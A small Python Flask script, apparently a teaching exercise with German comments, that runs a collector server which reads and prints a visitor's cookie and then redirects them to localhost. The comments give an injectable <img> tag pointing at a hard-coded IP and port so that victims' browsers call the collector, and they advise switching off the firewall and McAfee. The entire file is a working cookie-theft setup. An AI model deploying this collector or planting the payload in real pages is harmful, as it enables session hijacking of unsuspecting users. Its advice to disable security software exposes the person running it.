from flask import Flask, request, redirect

HOST = "0.0.0.0"
PORT = 5042
DEBUG = True

app = Flask(__name__)

@app.route("/")
def womanInTheMiddle():
    print("An Attack is in progress! Help!")
    biscuitSteal = request.cookies.get("name")
    print(f"Cookie: {biscuitSteal}")
    print("Biscuit steal completed!")
    return redirect("http://localhost:5002")


if __name__ == "__main__":
    app.run(host=HOST, port=PORT, debug=DEBUG)

# Bei Mac benötigte Einstellung zur Ausführung im lokalen Netzwerk:

# - Einstellungen -> Netzwerk

#                 -> Firewall ausschalten
#                 -> VPN & Filter -> Filter und Proxys -> McAfee ausschalten


# Kekse klauen mit Pferdeäpfeln bereits drin. Beispiel für Möhren:
# <img src="http://141.87.56.87:5042" alt="Möhren">

# Achtung ggf. IP-Adresse anpassen!